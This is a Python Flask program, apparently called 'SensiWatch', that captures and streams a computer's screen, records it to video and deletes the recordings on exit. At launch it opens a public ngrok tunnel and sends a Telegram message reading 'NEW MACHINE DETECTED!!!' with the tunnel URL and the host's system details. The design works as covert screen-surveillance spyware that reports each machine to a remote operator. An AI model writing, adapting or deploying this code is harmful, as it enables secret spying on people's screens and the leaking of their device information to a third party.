from flask import Flask, Response, request, abort, send_file, render_template, redirect, url_for, session
from PIL import ImageGrab
import cv2
import numpy as np
import random as rdm
from datetime import datetime
import string as stg
import os
from dotenv import load_dotenv
from functools import wraps
import shutil
import atexit
from flask_session import Session
import ngrok
import requests


app = Flask(__name__)

# Load environment variables
load_dotenv()

#  Get Credentials
AUTHORIZED_USERS = {
    "user": os.getenv("USER"),
    "password": os.getenv("PASS")
}

# Flask-Session configuration
app.config['SESSION_TYPE'] = 'filesystem'  # Store sessions in the file system
app.config['SECRET_KEY'] = os.urandom(24)  # Secret key for session encryption
Session(app)

HOST = os.getenv("HOST", "127.0.0.1")
PORT = os.getenv("PORT", 5590)
VIDEO_OUTPUT_FOLDER = os.getenv("VIDEO_OUTPUT_DIR", "video_output")
NGROK_TOKEN = os.getenv("NGROK_TOKEN", "")
TELEGRAM_CHATID = os.getenv("TELEGRAM_CHATID", "")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")


def verify_authentication():
    """
    Verify the user's credentials from the Authorization header.
    """
    if 'user' in session:
        return True
    return False


def requires_auth(func):
    """
    Decorator to protect routes with authentication.
    """
    @wraps(func)  # Preserve the original function name and metadata
    def wrapped(*args, **kwargs):
        if not verify_authentication():
            return redirect(url_for('login'))
        return func(*args, **kwargs)
    return wrapped


def new_video_filename():
    """
    Generate a video filename based on timestamp and random ASCII characters.
    """
    VIDEO_OUTPUT_FOLDER
    if not os.path.exists(VIDEO_OUTPUT_FOLDER):
        os.mkdir(VIDEO_OUTPUT_FOLDER)

    NEW_VIDEO_FILENAME = f'{VIDEO_OUTPUT_FOLDER}/VIDEO_'
    EXT = '.mp4'
    current_datetime = datetime.now()
    formatted_date = current_datetime.strftime('%Y%m%d%H%M%S')
    rand_str = ''.join(rdm.choices(stg.ascii_letters, k=12))
    return f"{NEW_VIDEO_FILENAME}{formatted_date}_{rand_str}{EXT}"


VIDEO_FILENAME = new_video_filename()  # Generate a video file name
output_video = cv2.VideoWriter(VIDEO_FILENAME, cv2.VideoWriter_fourcc(*'mp4v'), 10, (3840, 2160))  # 4K resolution


def generate_screen_frames():
    """
    Generate screen recording frames.
    """
    while True:
        screen = ImageGrab.grab()  # Capture the screen
        screen_np = np.array(screen)  # Convert to NumPy array
        _, screen_encoded = cv2.imencode('.jpg', cv2.cvtColor(screen_np, cv2.COLOR_RGB2BGR))  # Encode image as JPEG
        frame = screen_encoded.tobytes()
        output_video.write(cv2.cvtColor(screen_np, cv2.COLOR_RGB2BGR))  # Write frame to video file
        yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')


@app.route('/')
@requires_auth
def index():
    """
    Main index route (protected by authentication).
    """
    return render_template("dashboard.html")


@app.route('/get_screen_view')
@requires_auth
def get_screen_view():
    """
    Stream screen recording (protected by authentication).
    """
    return Response(generate_screen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')


@app.route('/download_video')
@requires_auth
def download_video():
    """
    Download the screen recording (protected by authentication).
    """
    try:
        output_video.release()
        return send_file(VIDEO_FILENAME, as_attachment=True)
    except Exception as e:
        return f"Error: {e}", 500


@app.route('/login', methods=['GET', 'POST'])
def login():
    """
    Handle user login.
    """
    if request.method == 'POST':
        if request.content_type == 'application/json':
            data = request.json
            username = data.get('username')
            password = data.get('password')
        else:
            username = request.form.get('username')
            password = request.form.get('password')

        if username == AUTHORIZED_USERS['user'] and password == AUTHORIZED_USERS['password']:
            session['user'] = username
            return {"message": "Login successful"}, 200
        else:
            return {"message": "Invalid credentials"}, 401
    return render_template('login.html')


@app.route('/logout')
def logout():
    """
    Logout and clear the session.
    """
    session.pop('user', None)
    return redirect(url_for('login'))


def cleanup():
    """
    Cleanup function to release the video writer and remove the video output folder on script exit.
    """
    try:
        if output_video.isOpened():
            output_video.release()  # Release the video writer resource
            print("VideoWriter resource released.")
        if os.path.exists(VIDEO_OUTPUT_FOLDER):
            shutil.rmtree(VIDEO_OUTPUT_FOLDER)  # Delete the entire folder
            print(f"Cleanup complete: Deleted folder {VIDEO_OUTPUT_FOLDER}")
    except PermissionError as e:
        print(f"PermissionError during cleanup: {e}")
    except Exception as e:
        print(f"Error during cleanup: {e}")


@app.errorhandler(401)
def custom_401(error):
    """
    Custom 401 error page.
    """
    return Response('Authentication Required', 401, {'WWW-Authenticate': 'Basic realm="SensiWatch"'})


def send_tg_msg(msg, chatid, bot_token):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        'chat_id': chatid,
        'text': msg
    }
    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()  # Raises an exception for HTTP errors
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print("Failed to send message, status code:", response.status_code)
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to Telegram: {e}")

def send_endpoint_msg(msg, url):
    payload = {'message': msg}
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()  # Raises an exception for HTTP errors
        if response.status_code == 200:
            print("Message sent to the endpoint successfully!")
        else:
            print("Failed to send message to the endpoint, status code:", response.status_code)
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to endpoint: {e}")

import platform
import psutil

def get_system_info():
    # Get general system info
    system_info = {
        "System": platform.system(),
        "Node Name": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Architecture": platform.architecture()[0],
        "CPU Cores": psutil.cpu_count(logical=False),  # Physical cores
        "Total RAM": psutil.virtual_memory().total / (1024 ** 3),  # in GB
        "Used RAM": psutil.virtual_memory().used / (1024 ** 3),  # in GB
        "Free RAM": psutil.virtual_memory().available / (1024 ** 3),  # in GB
        "CPU Usage": psutil.cpu_percent(interval=1),  # percentage
        "Disk Usage": psutil.disk_usage('/').percent,  # percentage
    }
    return system_info


# Register the cleanup function to run at exit
atexit.register(cleanup)

if __name__ == "__main__":
    try:
        if NGROK_TOKEN:
            print("Fetching remote loopback URL...")
            listener = ngrok.connect(PORT, authtoken=NGROK_TOKEN)
            lurl = listener.url()
            print (f"Loopback URL established at: {lurl}")
            if TELEGRAM_BOT_TOKEN and TELEGRAM_CHATID:
                systeminfo = get_system_info()
                msg = f"""
NEW MACHINE DETECTED!!!
LOOPBACK URL {lurl}
SYSTEM INFO:
System: {systeminfo['System']}
Node Name: {systeminfo['Node Name']}
Release: {systeminfo['Release']}
Version: {systeminfo['Version']}
Machine: {systeminfo['Machine']}
Processor: {systeminfo['Processor']}
Architecture: {systeminfo['Architecture']}
CPU Cores: {systeminfo['CPU Cores']}
Total RAM: {systeminfo['Total RAM']}
Used RAM: {systeminfo['Used RAM']}
Free RAM: {systeminfo['Free RAM']}
CPU Usage: {systeminfo['CPU Usage']}
Disk Usage: {systeminfo['Disk Usage']}
"""
                send_tg_msg(msg=msg, chatid=TELEGRAM_CHATID, bot_token=TELEGRAM_BOT_TOKEN)
            print("Starting server...")
        app.run(host=HOST, port=PORT)
    except KeyboardInterrupt:
        print("Shutting down...")
